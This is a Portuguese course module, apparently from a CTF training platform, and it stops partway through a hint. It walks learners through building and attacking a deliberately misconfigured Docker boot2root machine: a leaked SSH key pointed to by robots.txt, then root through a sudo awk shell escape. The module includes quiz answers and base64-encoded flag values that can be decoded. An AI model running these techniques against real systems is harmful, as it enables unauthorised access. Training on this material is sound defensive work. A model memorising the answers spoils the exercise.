@@ -1,0 +1,544 @@
+---
+slug: ctf-guiado
+track: trilha-8
+title: "Máquina CTF guiada"
+prerequisites: [metodologia-completa]
+lab: null
+tasks:
+  - slug: flag-user
+    title: "Flag de usuário (user.txt)"
+    type: flag
+    prompt: "Faça o recon, ache o que a web vaza, use isso para entrar por SSH como mike e leia /home/mike/user.txt. Cole a flag no formato FLAG{...}."
+    hint: "O nmap te deu duas portas. Comece pela web: um arquivo que o próprio servidor aponta ('o que não devia ser indexado') entrega um caminho — e nele há algo que serve de chave para a porta ao lado."
+    flag:
+      hash: "scrypt$16384$8$1$e21229b43568f94bb0bfcfed4f07efe744dc4d4ccb29a1c30fab3c51d1a22eba"
+      salt: "8162d01d926d126c1100e0d805bf581f"
+  - slug: flag-root
+    title: "Flag de root (root.txt)"
+    type: flag
+    prompt: "A partir de mike, escale a root e leia /root/root.txt. Cole a flag no formato FLAG{...}."
+    hint: "Não procure exploit. Pergunte o que esta conta pode rodar como root sem senha (sudo -l). Um comando comum liberado ali sabe executar outro comando — e o GTFOBins mostra como transformar isso num shell de root."
+    flag:
+      hash: "scrypt$16384$8$1$0336c506525003eb484c3212883519acefad2911fcdb6e29191e0a9d133c4540"
+      salt: "dee34846bd7ea62e1a8e7d74cb2bbd15"
+  - slug: quiz-final
+    title: "Quiz — Máquina CTF guiada"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "Numa máquina boot2root, o que as flags user.txt e root.txt representam?"
+        options:
+          - "Dois enigmas independentes, sem relação entre si"
+          - "user.txt prova o acesso inicial (usuário comum) e root.txt prova o controle total do host; juntas, documentam a cadeia acesso inicial → escalação de privilégio"
+          - "root.txt é opcional e vale só pontos extras"
+          - "As duas são a mesma string, escrita em dois lugares"
+        answer: 1
+        explanation: "No estilo boot2root, user.txt marca que você conseguiu o foothold (uma shell de usuário comum) e root.txt marca que escalou a root (controle total). A graça é a cadeia entre as duas — o mesmo arco de um ataque real. Não são independentes, root.txt é o objetivo final, e são valores distintos."
+      - question: "Neste módulo o foothold não veio de um exploit, mas de recon + uma chave SSH vazada na web. Por que isso é representativo do mundo real?"
+        options:
+          - "Porque exploits não funcionam em Linux"
+          - "Porque a maioria dos acessos iniciais reais vem de configuração errada e credencial exposta/reusada, não de um 0-day exótico"
+          - "Porque chave SSH é mais difícil de usar que senha"
+          - "Porque recon não faz parte de um ataque de verdade"
+        answer: 1
+        explanation: "Recon que acha um segredo exposto (uma chave, uma senha num backup) é um dos vetores de acesso inicial mais comuns que existem — bem mais do que um 0-day. Exploits funcionam, sim; chave SSH é trivial de usar; e o recon é justamente o começo de todo ataque. O ponto é: o caminho mais provável costuma ser o mais banal."
+      - question: "O arquivo robots.txt do servidor listava 'Disallow: /private/id_ed25519'. Que lição de segurança isso ensina?"
+        options:
+          - "robots.txt protege diretórios: o que está em Disallow fica inacessível"
+          - "robots.txt é só uma sugestão para buscadores; ele não restringe acesso nenhum e, ao listar caminhos 'secretos', na prática os ENTREGA a quem lê o arquivo"
+          - "robots.txt criptografa os caminhos listados"
+          - "robots.txt exige senha para os caminhos em Disallow"
+        answer: 1
+        explanation: "robots.txt só pede a robôs de busca que não indexem certos caminhos — não há controle de acesso nenhum. Qualquer um lê o arquivo e vê exatamente os caminhos que o dono quis 'esconder'. Usar robots.txt como segurança é um clássico tiro no pé: ele não protege, não criptografa, não pede senha; vira um mapa do tesouro."
+      - question: "Você baixou a chave e o SSH recusou com 'UNPROTECTED PRIVATE KEY FILE'. O que resolve?"
+        options:
+          - "Rodar o ssh como root"
+          - "`chmod 600` na chave: o SSH recusa uma chave privada legível por outros usuários, por segurança"
+          - "Renomear a chave para id_rsa"
+          - "Adicionar a opção -o StrictHostKeyChecking=no"
+        answer: 1
+        explanation: "O cliente SSH se recusa a usar uma chave privada com permissões frouxas (legível por outros) — é uma proteção contra roubo de chave. `chmod 600 chave` deixa só o dono ler/escrever e destrava o uso. Rodar como root não corrige a permissão do arquivo, o nome não importa, e StrictHostKeyChecking é sobre a chave do HOST, não a sua."
+      - question: "Como mike, `sudo -l` mostrou '(root) NOPASSWD: /usr/bin/awk'. Por que um comando tão comum vira root?"
+        options:
+          - "Porque o awk tem um bug de buffer overflow"
+          - "Porque o awk pode executar comandos do sistema (system()) e, rodando como root via sudo, esse comando também roda como root — um shell escape catalogado no GTFOBins"
+          - "Porque todo binário em /usr/bin é SUID"
+          - "Porque o awk descriptografa a senha do root"
+        answer: 1
+        explanation: "Não é bug: é funcionalidade. O awk executa programas e sabe chamar o shell com `BEGIN{system(\"/bin/sh\")}`. Se o sudo deixa você rodar o awk como root, o shell que ele abre também é root. O GTFOBins cataloga exatamente esses 'shell escapes'. Não é overflow, nem todo /usr/bin é SUID, e não há descriptografia alguma."
+      - question: "Você acabou de virar mike (foothold). Qual é o primeiro reflexo da metodologia antes de tentar virar root?"
+        options:
+          - "Reiniciar a máquina para limpar rastros"
+          - "Enumerar COMO mike: id, grupos, sudo -l, SUID, capabilities, arquivos legíveis — porque a nova identidade enxerga coisas que o www-data/rede não via"
+          - "Partir direto para um exploit de kernel"
+          - "Apagar o user.txt para não deixar evidência"
+        answer: 1
+        explanation: "Permissões no Linux são por identidade. Assim que você vira mike, o reflexo é re-enumerar como mike: `sudo -l`, grupos, SUID, capabilities, arquivos legíveis. É isso que revela o próximo salto (aqui, a regra de sudo). Reiniciar não ajuda, kernel exploit é último recurso, e apagar flags é vandalismo, não método."
+      - question: "Resolver esta máquina guiada é legítimo. Quando a MESMA técnica deixa de ser legítima?"
+        options:
+          - "Nunca: quem sabe a técnica pode usá-la onde quiser"
+          - "Quando aplicada a um sistema que não é seu, sem escopo e autorização por escrito — aí é crime (Lei 12.737/2012), por mais 'didático' que o motivo pareça"
+          - "Só se você causar prejuízo financeiro"
+          - "Só em sistemas do governo"
+        answer: 1
+        explanation: "O que separa o treino do crime é a autorização. Aqui o alvo é seu, isolado e feito para isso. A mesma sequência contra um sistema de terceiros, sem escopo e autorização por escrito (Trilha 1), é acesso não autorizado — crime no Brasil pela Lei 12.737/2012, independentemente de ter dado prejuízo, de ser governo ou da 'boa intenção'."
+glossary:
+  - term: robots.txt
+    definition: "Arquivo de texto na raiz de um site que pede aos robôs de busca quais caminhos não indexar. Não é controle de acesso: não restringe nada e, ao listar caminhos 'secretos', acaba revelando-os a quem o lê — por isso é uma fonte clássica de content discovery."
+---
+
+import cadeia from "./img/cadeia-da-maquina.svg";
+import anatomia from "./img/anatomia-boot2root.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+Até aqui você aprendeu as peças separadas: <GlossaryTerm term="Nmap">nmap</GlossaryTerm> e <GlossaryTerm term="content discovery">content discovery</GlossaryTerm> na Trilha 2, a exploração web na Trilha 4, a escalação de privilégio na Trilha 6, e no 8.1 você as alinhou numa <GlossaryTerm term="PTES">metodologia</GlossaryTerm> única. Este módulo é a **primeira vez que você junta tudo contra uma máquina inteira**: uma <GlossaryTerm term="boot2root">boot2root</GlossaryTerm> — um host que você ataca de fora e precisa comprometer até o controle total, colhendo duas <GlossaryTerm term="flag (CTF)">flags</GlossaryTerm> pelo caminho.
+
+É a experiência clássica das plataformas estilo TryHackMe e Hack The Box: você recebe um alvo, e ninguém te dá o roteiro. A diferença deste módulo é que ele é **guiado**. Em cada ponto onde um iniciante costuma travar, há uma dica escondida (um `<Hint>`) que você abre **só se precisar**, e a solução completa recolhida logo abaixo. É o andaime certo para a sua primeira máquina: você tenta sozinho, e o apoio está ali quando a cabeça empaca. No próximo módulo (8.3) o andaime some.
+
+Por que isso importa no mundo real? Porque a esmagadora maioria dos comprometimentos **não** começa com um exploit genial. Começa com recon que acha algo exposto — uma credencial num arquivo, um serviço com senha padrão — e segue com uma escalação a partir de uma configuração errada. Foi assim que o **botnet Mirai** transformou o recon de credenciais padrão em centenas de milhares de máquinas invadidas (seção 4). A máquina que você vai resolver é essa cadeia banal e devastadora, em miniatura e no seu controle.
+
+**Ao final, você vai saber:**
+
+- aplicar a metodologia <GlossaryTerm term="reconnaissance">recon</GlossaryTerm> → <GlossaryTerm term="foothold">foothold</GlossaryTerm> → <GlossaryTerm term="privilege escalation">privilege escalation</GlossaryTerm> de ponta a ponta contra uma máquina boot2root que você nunca viu;
+- fazer o reconhecimento das portas com o nmap e o content discovery da web, e transformar um achado (um <GlossaryTerm term="robots.txt">robots.txt</GlossaryTerm> indiscreto) no foothold;
+- entrar por <GlossaryTerm term="SSH">SSH</GlossaryTerm> com uma <GlossaryTerm term="SSH key">chave privada</GlossaryTerm> vazada e entender por que o `chmod 600` é obrigatório;
+- escalar de usuário comum a root abusando de uma regra de `sudo`, usando um <GlossaryTerm term="shell escape">shell escape</GlossaryTerm> do <GlossaryTerm term="GTFOBins">GTFOBins</GlossaryTerm>;
+- colher as flags `user.txt` e `root.txt`, re-enumerando a cada troca de identidade — e saber o limite ético de tudo isso.
+
+**Pré-requisitos:** 8.1 — Metodologia completa de ataque (a espinha recon → acesso → escalação que você vai executar aqui). Você também reaproveita o nmap e o content discovery (Trilha 2) e a escalação por `sudo`/`SUID`/capabilities (Trilha 6).
+
+**Tempo estimado:** 2 a 3 horas, incluindo montar a máquina.
+
+<Callout variant="ethics">
+A máquina deste módulo é um **contêiner descartável que você monta no seu próprio WSL**, publicado **apenas em `127.0.0.1`** (a mesma regra de isolamento dos alvos oficiais da plataforma) e **sem nenhuma vulnerabilidade escrita sob medida** — só más configurações de software padrão. Resolver uma máquina de CTF assim é legítimo porque o alvo é seu, isolado e feito para isso. Levar a mesma técnica a um sistema que não é seu, sem <GlossaryTerm term="scope">escopo</GlossaryTerm> e **autorização por escrito** (Trilha 1), é crime no Brasil: acesso não autorizado a dispositivo informático, Lei 12.737/2012.
+</Callout>
+
+## 2. Teoria aprofundada — a máquina por dentro
+
+### 2.1 O que é uma máquina boot2root
+
+Uma <GlossaryTerm term="flag (CTF)">CTF</GlossaryTerm> (Capture The Flag) é um exercício em que você prova ter resolvido um desafio achando uma **flag**: uma string escondida que só aparece quando você completa o objetivo de verdade. No estilo **boot2root**, o desafio é um **host inteiro**, e o objetivo é ir de fora (sem acesso nenhum) até o controle total — o `root` no Linux, o `SYSTEM` no Windows. O nome vem daí: do boot (a máquina ligada, intocada) ao root (você no comando dela).
+
+A convenção são **duas flags**, e elas não são decorativas — contam a história do ataque:
+
+- **`user.txt`** fica na pasta de um usuário comum e prova o **foothold**: você conseguiu uma primeira shell, com privilégio baixo.
+- **`root.txt`** fica em `/root` e prova a **escalação**: você virou administrador e controla o host.
+
+<Figure
+  src={anatomia}
+  alt="Escada de três degraus subindo da esquerda para a direita. Degrau de baixo: DE FORA, sem acesso, só os serviços expostos. A primeira subida, o foothold (recon mais uma credencial achada), leva ao degrau do meio: USUÁRIO COMUM, com a flag user.txt. A segunda subida, a privilege escalation (abuso de configuração: sudo, SUID ou capability), leva ao degrau de cima: ROOT, com a flag root.txt. Uma tarja à direita lembra que, numa máquina guiada, cada subida tem uma dica escondida para abrir só se você travar."
+  caption="A anatomia de um boot2root: você sobe dois degraus (foothold e escalação) e cada um deixa uma flag. Numa máquina guiada, há uma dica esperando em cada subida."
+/>
+
+O arco `user.txt` → `root.txt` é **exatamente** o arco de um ataque real: acesso inicial, depois escalação de privilégio. Treinar numa máquina de CTF treina o mesmo músculo — com a diferença de que aqui o alvo é seu e você pode errar à vontade.
+
+### 2.2 Por que "guiada" — e o que a guia não te dá
+
+Numa máquina real não existe botão "Dica". Então por que começar guiado? Porque a competência de resolver sozinho se **constrói**, ela não aparece do nada. A primeira vez que alguém olha para uma shell crua e não sabe o que investigar primeiro, congela. A máquina guiada quebra esse congelamento: você tenta, e se empacar há uma direção (não a resposta pronta) a um clique. Você aprende o **reflexo** — "foothold novo? re-enumere; não sei escalar? `sudo -l` primeiro" — com rede de proteção.
+
+O que a guia **não** te dá é a resposta mastigada. Cada `<Hint>` aponta a direção ("olhe o `robots.txt`", "pense no `sudo -l`"), não entrega o comando final. A `<Solution>` completa existe, mas recolhida: abra-a para **conferir** depois de tentar, ou para destravar se a dica não bastou. Quem abre tudo de cara não treina nada — treina copiar.
+
+### 2.3 Os dois degraus desta máquina
+
+Toda boot2root se resume aos dois degraus da figura. Nesta máquina eles são:
+
+**Degrau 1 — o foothold, por recon + credencial achada.** O host expõe um servidor web e um <GlossaryTerm term="SSH">SSH</GlossaryTerm>. A web tem um erro de configuração que deixa um segredo à mostra — uma <GlossaryTerm term="SSH key">chave SSH privada</GlossaryTerm> esquecida num diretório servido pela web, apontada por um <GlossaryTerm term="robots.txt">robots.txt</GlossaryTerm> indiscreto. Repare: **não é um exploit**. É recon (achar a chave) somado a usá-la para entrar. Esse é o acesso inicial mais comum do mundo real, não o 0-day.
+
+**Degrau 2 — a escalação, por abuso de `sudo`.** Já dentro como o usuário `mike`, a enumeração revela que ele pode rodar um comando comum como root sem senha. O comando parece inofensivo, mas sabe **executar outro comando** — e, rodando como root, o que ele executa também roda como root. É um <GlossaryTerm term="shell escape">shell escape</GlossaryTerm>: escapar de um comando restrito para um shell pleno. Você viu a ideia na Trilha 6; aqui ela fecha a máquina.
+
+### 2.4 Por que a enumeração é o centro de gravidade
+
+Se há uma lição que o 8.1 martelou e esta máquina confirma, é esta: **entre um passo e o próximo, o que decide é a enumeração**, não o ataque. Você não "adivinha" que há uma chave na web — você **enumera** a web e acha. Você não "chuta" como virar root — você roda `sudo -l`, `id`, `getcap`, lista SUID, e o caminho aparece. E a regra de ouro: **cada vez que você troca de identidade, re-enumere do zero como a nova identidade**, porque permissões no Linux são por usuário, e o que `mike` enxerga é diferente do que a conta de serviço da web enxergava. Quem internaliza isso nunca fica olhando para o cursor sem saber o que fazer.
+
+## 3. Na prática da segurança — como se resolve uma máquina
+
+Este é um módulo de consolidação (não ensina um ataque novo, junta os que você já sabe), então esta seção mostra **como um profissional conduz** o ataque a uma máquina, não um vetor isolado.
+
+### 3.1 Sempre a mesma ordem: recon, foothold, escalação
+
+Diante de qualquer host desconhecido, a ordem é sempre a mesma, e ela te protege de travar:
+
+1. **Recon de rede.** O que está exposto? Portas, serviços, versões. É o nmap. Nada de atacar antes de saber a superfície.
+2. **Enumeração de cada serviço.** Para cada porta aberta, o que dá para extrair? Na web, é content discovery (arquivos, diretórios, `robots.txt`, comentários). Aqui mora a maior parte dos footholds.
+3. **Foothold.** O menor acesso que você conseguir — uma shell, um login. Não precisa ser elegante; precisa ser um pé na porta.
+4. **Re-enumeração local + escalação.** Já dentro, enumere como a identidade atual e escale. Repita a cada salto.
+
+<Figure
+  src={cadeia}
+  alt="Três estágios da esquerda para a direita. RECON: nmap -sV -p 2222,8080 revela 2222/ssh (OpenSSH) e 8080/http (nginx). FOOTHOLD: GET /robots.txt entrega o caminho /private/, onde está /private/id_ed25519, uma chave SSH privada vazada; com ela e chmod 600, ssh -i entra como mike e lê a flag user.txt. ESCALAÇÃO: sudo -l mostra (root) NOPASSWD /usr/bin/awk; sudo awk com BEGIN system bin sh abre um shell de root (uid=0), que lê a flag root.txt."
+  caption="A cadeia concreta desta máquina: cada estágio alimenta o próximo. O recon acha a web, a web vaza a chave, a chave dá o usuário, o sudo dá o root."
+/>
+
+### 3.2 Enumeração manual e automática
+
+Na Trilha 6 você conheceu o LinPEAS, que varre a máquina e aponta vetores de escalação. Use-o — mas a lenda do próprio LinPEAS avisa: ele cobre ~95%, e os 5% que vencem a máquina saem do **olho treinado** lendo a saída e da enumeração manual (`sudo -l`, `id`, `getcap`, grupos, `find` por arquivos legíveis). Nesta máquina, um `sudo -l` de um segundo já entrega o degrau 2. Automático para cobertura; manual para o insight.
+
+### 3.3 O que o CTF treina — e o que ele não ensina
+
+O método (enumerar, achar o vetor, escalar) é idêntico ao de um pentest real, e é por isso que o treino vale. Mas guarde as diferenças, para não levar vício ao trabalho:
+
+- **Barulho.** No CTF você faz todo o barulho do mundo — a máquina é sua. Num ambiente real, varreduras agressivas e exploits instáveis podem derrubar produção e disparar alertas. A contenção você aprende na Trilha 1 e no relatório (8.4).
+- **Objetivo.** O CTF termina na flag. Um pentest termina no **relatório** reproduzível. A flag é a anedota "eu entrei"; o relatório é o trabalho.
+- **Autorização.** A máquina de CTF é feita para ser quebrada. Um sistema real exige <GlossaryTerm term="scope">escopo</GlossaryTerm> e autorização por escrito — sem isso, a mesma ação é crime.
+
+## 4. Casos reais — o recon e a credencial achada, em escala
+
+### Mirai (2016) — recon de credenciais padrão vira centenas de milhares de máquinas
+
+O botnet **Mirai** é o caso perfeito para o degrau 1 desta máquina, porque o foothold dele era puro **recon + credencial que não devia funcionar**. O Mirai varria a internet à procura de dispositivos de IoT (câmeras, DVRs, roteadores) e tentava entrar por Telnet/SSH usando uma tabela de **64 pares de usuário e senha padrão de fábrica** (`admin:admin`, `root:12345` e afins). Cada dispositivo que ainda usava a senha de fábrica virava um nó do botnet — sem exploit nenhum, só uma credencial exposta.
+
+Em **21 de outubro de 2016**, esse exército de dispositivos lançou um ataque de negação de serviço (DDoS) massivo contra a **Dyn**, uma provedora de DNS, derrubando o acesso a Twitter, Netflix, Reddit, GitHub e dezenas de outros grandes sites em boa parte dos EUA. Segundo o acordo de culpa de um dos autores, o botnet chegou a escravizar **mais de 300 mil** dispositivos de IoT.
+
+- **Impacto:** interrupção de serviços de internet de grande escala; o código-fonte do Mirai, publicado pelos autores, gerou incontáveis variantes que persistem até hoje.
+- **Desfecho:** em **13 de dezembro de 2017**, o Departamento de Justiça dos EUA divulgou os acordos de culpa de Paras Jha, Josiah White e Dalton Norman, que haviam se declarado culpados dias antes no Distrito do Alasca por conspiração sob o Computer Fraud and Abuse Act.
+- **Lição:** o vetor mais comum e mais devastador costuma ser o mais banal — uma **credencial padrão/exposta** encontrada por varredura. É o degrau 1 da sua máquina (uma chave vazada achada por recon), multiplicado por centenas de milhares.
+- **Fontes:** [U.S. Department of Justice — "Justice Department Announces Charges and Guilty Pleas in Three Computer Crime Cases" (13 dez. 2017)](https://www.justice.gov/opa/pr/justice-department-announces-charges-and-guilty-pleas-three-computer-crime-cases-involving); análise técnica em [Krebs on Security — "Mirai IoT Botnet Co-Authors Plead Guilty" (13 dez. 2017)](https://krebsonsecurity.com/2017/12/mirai-iot-botnet-co-authors-plead-guilty/).
+
+### WannaCry (2017) — o degrau que ninguém fechou
+
+Se o Mirai ilustra o foothold, o **WannaCry** ilustra a outra metade da lição desta máquina: **um caminho conhecido, deixado aberto, dá o controle total**. Em **12 de maio de 2017**, o ransomware WannaCry se espalhou pelo mundo explorando uma falha no protocolo de compartilhamento de arquivos SMBv1 do Windows. A Microsoft já havia publicado a correção — o boletim **MS17-010** — em **14 de março de 2017**, quase dois meses antes; as máquinas atingidas eram as que não a aplicaram (ou rodavam versões sem suporte).
+
+No Reino Unido, o serviço de saúde (NHS) foi um dos mais afetados: segundo o relatório oficial do National Audit Office, **pelo menos 81 das 236** organizações de saúde (trusts) da Inglaterra foram atingidas, além de centenas de outras unidades, com consultas e cirurgias canceladas. Estimativas da Europol apontaram mais de **200 mil** computadores infectados em cerca de **150 países**.
+
+- **Impacto:** paralisação de serviços essenciais (saúde, indústria, logística) em escala global; prejuízo estimado em centenas de milhões de dólares.
+- **Lição:** o degrau estava documentado e **tinha conserto** (o patch existia); ninguém o fechou. Na sua máquina, a regra de `sudo` que leva a root é o eco disso — um caminho conhecido-perigoso deixado no lugar. O trabalho do defensor é **fechar o degrau antes** que alguém suba por ele.
+- **Fontes:** [Microsoft Security Bulletin MS17-010 — Critical (14 mar. 2017)](https://learn.microsoft.com/security-updates/securitybulletins/2017/ms17-010); [UK National Audit Office — "Investigation: WannaCry cyber attack and the NHS" (out. 2017)](https://www.nao.org.uk/reports/investigation-wannacry-cyber-attack-and-the-nhs/).
+
+## 5. Mãos à obra — resolva a máquina
+
+Este módulo **não tem lab na plataforma** (`lab: null`): uma máquina boot2root é um host **mal configurado de propósito**, e a plataforma só orquestra alvos consagrados (DVWA, Juice Shop...). Então você monta, no seu próprio WSL, um contêiner descartável de treino — como fez no 6.3 e no 6.6 — e o ataca **de fora**, a partir do seu terminal, como uma máquina de CTF de verdade.
+
+<Callout variant="info" title="Por que publicado só em 127.0.0.1">
+Para haver recon de rede, o atacante (seu WSL) precisa de um caminho até o alvo. A solução segura é publicar as portas do contêiner **apenas no loopback** (`127.0.0.1`), exatamente a regra de isolamento dos alvos oficiais: nada fica acessível a outros aparelhos da rede. O contêiner sobe com `--rm` (some ao sair), sem exploit sob medida, e o `uid 0` **dentro** dele não é o root do seu WSL (namespaces — releia o 6.1).
+</Callout>
+
+**Objetivo:** ao terminar, você terá (1) feito o recon, achado o que a web vaza e entrado por SSH como `mike`, lendo `/home/mike/user.txt` — a **flag de usuário**; e (2) escalado de `mike` a `root` e lido `/root/root.txt` — a **flag de root**. Duas flags, uma máquina. As dicas estão aqui; use-as só quando travar.
+
+### 5.1 Montar a máquina (passo a passo)
+
+Abra o terminal do Ubuntu (WSL), crie uma pasta e os três arquivos abaixo. O `Dockerfile` é a receita do host; o `nginx-site.conf` configura a web; o `entrypoint.sh` liga os serviços. As duas flags nascem em **base64** dentro do `Dockerfile`, para não aparecerem em claro — mas, ao montar, cada arquivo nasce com a flag **certa**, a que a plataforma valida.
+
+<CodeBlock
+  title="~/ctf-guiado/Dockerfile"
+  lang="text"
+  code={`FROM debian:trixie-slim
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt-get update \\
+ && apt-get install -y --no-install-recommends \\
+    openssh-server openssh-client nginx sudo gawk procps iproute2 findutils coreutils grep passwd login curl ca-certificates \\
+ && rm -rf /var/lib/apt/lists/*
+
+# Low-privilege account: the foothold identity you reach over SSH.
+RUN useradd --create-home --shell /bin/bash --uid 1001 mike \\
+ && echo 'mike:Unused-Local-Pw-9517' | chpasswd
+
+# Misconfig 1: a private SSH key left under the web root, and a robots.txt
+# that points right at it (disclosing the "hidden" path instead of hiding it).
+RUN ssh-keygen -t ed25519 -N '' -C 'mike@target deploy key' -f /tmp/deploykey \\
+ && install -d -m 755 /var/www/html/private \\
+ && cp /tmp/deploykey /var/www/html/private/id_ed25519 \\
+ && chmod 644 /var/www/html/private/id_ed25519 \\
+ && printf '%s\\n' \\
+    '# deploy notes (mike) - DO NOT PUBLISH' \\
+    'The CI uses my ed25519 key to ssh into this box as mike for deploys.' \\
+    'Key is in this folder as id_ed25519. Remember to move it off the web root.' \\
+    > /var/www/html/private/README.txt \\
+ && chmod 644 /var/www/html/private/README.txt \\
+ && install -d -m 700 -o mike -g mike /home/mike/.ssh \\
+ && cp /tmp/deploykey.pub /home/mike/.ssh/authorized_keys \\
+ && chown mike:mike /home/mike/.ssh/authorized_keys \\
+ && chmod 600 /home/mike/.ssh/authorized_keys \\
+ && rm -f /tmp/deploykey /tmp/deploykey.pub \\
+ && printf '%s\\n' '<h1>FunBox Transfer Portal</h1><p>Nothing to see here.</p>' > /var/www/html/index.html \\
+ && printf '%s\\n' 'User-agent: *' 'Disallow: /private/id_ed25519' 'Disallow: /private/README.txt' > /var/www/html/robots.txt
+
+COPY nginx-site.conf /etc/nginx/sites-available/default
+
+# Misconfig 2: sudo NOPASSWD on a GTFOBins-exploitable standard binary (awk).
+RUN printf '%s\\n' 'mike ALL=(root) NOPASSWD: /usr/bin/awk' > /etc/sudoers.d/mike \\
+ && chmod 440 /etc/sudoers.d/mike
+
+# user.txt: readable only after you become mike. (base64, so not in clear text)
+RUN { echo 'RkxBR3t1c2VyLXJvYm90cy1sZWFrLXNzaC1rZXl9' | base64 -d; echo; } > /home/mike/user.txt \\
+ && chown mike:mike /home/mike/user.txt && chmod 600 /home/mike/user.txt
+
+# root.txt: readable only as root. (base64, so not in clear text)
+RUN { echo 'RkxBR3tyb290LXN1ZG8tYXdrLXNoZWxsLWVzY2FwZX0=' | base64 -d; echo; } > /root/root.txt \\
+ && chmod 600 /root/root.txt
+
+# SSH: key-based only, so the leaked key is the intended way in.
+RUN mkdir -p /run/sshd \\
+ && sed -i 's/^#\\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config \\
+ && printf '%s\\n' 'PubkeyAuthentication yes' >> /etc/ssh/sshd_config
+
+COPY entrypoint.sh /usr/local/sbin/entrypoint.sh
+RUN chmod 755 /usr/local/sbin/entrypoint.sh
+EXPOSE 22 80
+ENTRYPOINT ["/usr/local/sbin/entrypoint.sh"]`}
+/>
+
+<CodeBlock
+  title="~/ctf-guiado/nginx-site.conf"
+  lang="text"
+  code={`server {
+    listen 80 default_server;
+    root /var/www/html;
+    index index.html;
+    autoindex off;         # directory listing OFF (the leak is via robots.txt)
+    location / { try_files $uri $uri/ =404; }
+}`}
+/>
+
+<CodeBlock
+  title="~/ctf-guiado/entrypoint.sh"
+  lang="bash"
+  code={`#!/bin/sh
+ssh-keygen -A >/dev/null 2>&1
+service nginx start >/dev/null 2>&1
+exec /usr/sbin/sshd -D -e`}
+/>
+
+Construa a imagem (isto usa a internet da sua máquina, uma vez) e suba o host com as portas **só no loopback**:
+
+```console
+$ cd ~/ctf-guiado
+$ docker build -t ctf-guiado:local .
+$ docker run -d --rm --name ctf-guiado --hostname target \
+    -p 127.0.0.1:2222:22 -p 127.0.0.1:8080:80 ctf-guiado:local
+$ docker port ctf-guiado
+22/tcp -> 127.0.0.1:2222
+80/tcp -> 127.0.0.1:8080
+```
+
+O alvo está no ar, escutando SSH em `127.0.0.1:2222` e web em `127.0.0.1:8080`. A partir daqui você é o atacante. Boa caçada — e lembre: tente antes de abrir as dicas.
+
+### 5.2 Recon (guiado)
+
+Comece como todo ataque: o que está exposto? Faça o <GlossaryTerm term="reconnaissance">recon</GlossaryTerm> das portas publicadas com o <GlossaryTerm term="Nmap">nmap</GlossaryTerm> (2.4). Se ele não estiver no seu WSL, instale com `sudo apt install -y nmap`, ou use o `curl`/`ss` que você já tem.
+
+```console
+$ nmap -sV -p 2222,8080 127.0.0.1
+PORT     STATE SERVICE VERSION
+2222/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
+8080/tcp open  http    nginx
+```
+
+Dois serviços: **SSH** na 2222 e um **servidor web nginx** na 8080. SSH quase nunca é a porta de entrada direta (você precisa de uma credencial); a web é a superfície rica. Olhe a web primeiro:
+
+```console
+$ curl -s http://127.0.0.1:8080/
+<h1>FunBox Transfer Portal</h1><p>Nothing to see here.</p>
+```
+
+"Nada para ver aqui." Será? Hora do reflexo do 2.8: content discovery. O que mais o servidor expõe?
+
+### 5.3 Desafio — do recon ao foothold (flag de usuário)
+
+**Objetivo:** conseguir uma shell por SSH como `mike` e ler `/home/mike/user.txt`. O caminho começa num arquivo que quase todo site tem e quase ninguém lê com olhos de atacante — um arquivo em que o próprio servidor **lista o que não quer que seja indexado**. Pense no que isso entrega a quem está procurando.
+
+<Hint title="Dica 1 — por onde começar o content discovery">
+Antes de sair chutando diretórios, leia o que o site já te oferece. Dois arquivos clássicos ficam na raiz: `/robots.txt` (o que não indexar) e, às vezes, um `sitemap.xml`. Um `curl http://127.0.0.1:8080/robots.txt` custa um segundo.
+</Hint>
+
+<Hint title="Dica 2 — o que o robots.txt entrega">
+O `robots.txt` lista caminhos em `Disallow:`. Ele **não** protege esses caminhos — só pede para robôs não indexá-los. Para você, é um mapa: acesse cada caminho listado. Um deles é uma chave privada; a outra é uma nota explicando de quem ela é e para que serve.
+</Hint>
+
+<Hint title="Dica 3 — da chave ao login">
+Você baixou uma chave SSH **privada**. A porta 2222 é SSH, e a nota diz que a chave é do usuário `mike`. Para usar uma chave privada baixada, o SSH exige que ela não seja legível por outros: `chmod 600`. Depois, `ssh -i <chave> -p 2222 mike@127.0.0.1`.
+</Hint>
+
+<Solution title="Solução — confira só depois de tentar">
+O content discovery começa pelo `robots.txt`, que — em vez de esconder — **entrega** os caminhos:
+
+```console
+$ curl -s http://127.0.0.1:8080/robots.txt
+User-agent: *
+Disallow: /private/id_ed25519
+Disallow: /private/README.txt
+```
+
+Os dois caminhos "proibidos" são exatamente o que queremos. Veja a nota e a chave:
+
+```console
+$ curl -s http://127.0.0.1:8080/private/README.txt
+# deploy notes (mike) - DO NOT PUBLISH
+The CI uses my ed25519 key to ssh into this box as mike for deploys.
+Key is in this folder as id_ed25519. Remember to move it off the web root.
+
+$ curl -s http://127.0.0.1:8080/private/id_ed25519 | head -n 2
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW...
+```
+
+Uma chave SSH **privada** (achado de recon), de `mike`. Baixe-a, ajuste a permissão (o SSH recusa chave privada legível por outros) e entre:
+
+```console
+$ curl -s http://127.0.0.1:8080/private/id_ed25519 -o mike_key
+$ chmod 600 mike_key
+$ ssh -i mike_key -p 2222 mike@127.0.0.1
+The authenticity of host '[127.0.0.1]:2222 ...' can't be established.
+ED25519 key fingerprint is SHA256:...
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+mike@target:~$ id
+uid=1001(mike) gid=1001(mike) groups=1001(mike)
+mike@target:~$ cat ~/user.txt
+FLAG{...}        # a flag de usuário — mande no cartão da tarefa
+```
+
+**Lição:** o foothold não foi exploit — foi content discovery (um `robots.txt` indiscreto) + uma credencial (a chave) achada e usada. O mesmo padrão do Mirai, só que com uma chave no lugar de uma senha padrão.
+</Solution>
+
+<FlagInput task="flag-user" />
+
+### 5.4 Desafio — do foothold a root (flag de root)
+
+**Você é `mike` agora.** O objetivo é virar `root` e ler `/root/root.txt`. Antes de qualquer coisa, o reflexo do 2.4: **re-enumere como `mike`** — a conta nova enxerga coisas que o recon externo não via. E comece pela pergunta de escalação que custa um comando e abre a maioria dos hosts Linux.
+
+<Hint title="Dica 1 — a pergunta certa">
